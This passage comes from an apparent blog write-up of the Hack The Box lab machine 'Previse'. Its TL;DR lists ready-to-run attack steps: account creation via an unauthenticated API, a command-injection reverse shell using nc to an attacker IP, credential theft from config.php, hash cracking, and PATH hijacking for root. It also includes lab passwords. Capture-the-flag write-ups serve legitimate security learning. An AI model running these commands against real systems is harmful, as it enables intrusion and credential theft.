+the output of any command unless it&rsquo;s redirected to <code>stderr</code>.</p>
+<p>Here&rsquo;s an example of what it would have looked like had we not put the redirect in our <code>./gzip</code>
+file (assuming <code>755</code> permissions and the <code>PATH</code> are already set).</p>
+<pre tabindex="0"><code>m4lwhere@previse:~$ echo &quot;/bin/bash&quot; &gt; ./gzip
+m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
+root@previse:~# ls -la
+root@previse:~# cat /root/root.txt
+root@previse:~# cat /root/root.txt &gt;&amp;2
+346883462c8bcc92aa4ccd12128874ce
+</code></pre><p>The shell is obviously borked and displaying <code>stderr</code>, making the redirect of <code>stdout</code> to <code>stderr</code>
+necessary to see any output from standard commands. If invoking commands from a script, using
+absolute paths instead of relative ones is the key take away here.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Well, that was the last one to close out the year. <code>Previse</code> was a first from <code>m4lwhere</code> that proved
+to be enjoyable. The foothold is the most time consuming part because a standard web browser
+withholds valuable information through the redirect on <code>/index.php</code>. Once that was figured out, we
+were able to create our own user by leveraging an unauthenticated administrative API. A reverse
+shell was made possible by the fact that the <code>delim</code> parameter for <code>POST</code> requests to <code>logs.php</code>
+isn&rsquo;t sanitized. Following that, database credentials stored in a configuration file made it
+possible to connect locally to the database and retrieve user hashes. The <code>m4lwhere</code> user reused his
+password for the system and that made it possible to login through SSH. Finally, <code>root</code> was
+achievable through a badly written script.</p>
+<p>An all around fun machine containing basic misconfigurations and basic scripting mistakes that
+allows an attacker to take a hold of it. I hope you enjoyed reading as much as I enjoyed writing
+about it!</p>
+<p>In 2022, I&rsquo;m aiming to start including some more challenging machines from the medium difficulty
+range and maybe some Windows machines so stay tuned!</p>
+<p>Until then, happy hacking!</p>
+<ul>
+<li>redbay</li>
+</ul>
+<h2 id="tldr">TL;DR<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="foothold-1">Foothold<a href="#foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Create your user: <code>$ curl -XPOST 'http://previse.htb/accounts.php' --data-raw 'username=redbay&amp;password=redbay&amp;confirm=redbay'</code></li>
+<li>Login: <code>$ curl -XPOST -c - 'http://previse.htb/login.php' --data-raw 'username=redbay&amp;password=redbay'</code></li>
+<li>Setup attacker machine <code>$ nc -lvnp 4445</code></li>
+<li>Reverse shell through <code>$ curl -XPOST 'http://previse.htb/logs.php' -H 'Cookie: PHPSESSID=jg7bi95its9ketrfm5j2ht21q5' --data-raw 'delim=space; nc &lt;attack ip&gt; 4445 -e /bin/bash'</code></li>
+</ol>
+<h3 id="user-1">User<a href="#user-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Get <code>mysql</code> credentials from <code>/var/www/html/config.php</code></li>
+<li>Log into <code>mysql</code> service: <code>mysql -h localhost -u root --password='mySQL_p@ssw0rd!:)' --database=previse</code></li>
+<li>Get user hashes: <code>select * from accounts;</code> &ndash;&gt; <code>m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.</code></li>
+<li>Crack with <code>hashcat</code> and <code>RockYou.txt</code> word list: <code>hashcat -a 0 -m 500 &lt;hash file&gt; &lt;wordlist&gt;</code></li>
+<li>User password: <code>ilovecody112235!</code></li>
+<li>Login through SSH</li>
+</ol>
+<h3 id="root-1">Root<a href="#root-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li><code>echo &quot;/bin/bash 1&gt;&amp;2&quot; &gt; ./gzip</code></li>
+<li><code>chmod 755 ./gzip</code></li>
+<li><code>export PATH=./:$PATH</code></li>
+<li><code>sudo /opt/scripts/access_backup.sh</code></li>
+</ol>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Reda Baydoun</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://theredbay.net/assets/main.js"></script>
+<script src="https://theredbay.net/assets/prism.js"></script>
+
+
+  <script src="https://theredbay.net/assets/languageSelector.js"></script>
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
